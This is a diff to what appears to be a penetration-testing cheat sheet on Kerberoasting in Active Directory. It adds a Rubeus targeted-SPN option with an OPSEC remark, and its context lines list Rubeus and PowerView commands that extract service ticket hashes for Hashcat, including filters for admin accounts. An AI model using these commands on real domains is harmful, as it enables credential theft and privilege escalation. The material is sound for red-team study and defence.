@@ -1,4 +1,4 @@
-Kerberoasting is a lateral movement/privilege escalation technique in Active Directory environments. This attack targets [Service Principal Names (SPN)](https://docs.microsoft.com/en-us/windows/win32/ad/service-principal-names) accounts.
+Kerberoasting is a lateral movement/privilege escalation technique in Active Directory environments. This attack targets [Service Principal Names (SPN)](https://docs.microsoft.com/en-us/windows/win32/ad/service-principal-names) accounts
 
 ## Kerberoast Attack Methodology
 #### Linux
@@ -29,6 +29,7 @@ Get-DomainUser -Identity <user> | Get-DomainSPNTicket -Format Hashcat # Target u
 .\Rubeus.exe kerberoast /stats # shows kerberostable users
 .\Rubeus.exe kerberoast /nowrap # Easily copy hash
 .\Rubeus.exe kerberoast /outfile:hashes.kerberoast # redirects output to file
+/spn:<SPN>                 # targeted kerberoast!!!!!!!!!!!!! (OPSEC)
 /ldapfilter:'admincount=1' # only target admins
 /user:<user>               # specifiy user
 /tgtdeleg                  # request RC4 ticket if default is AES or other
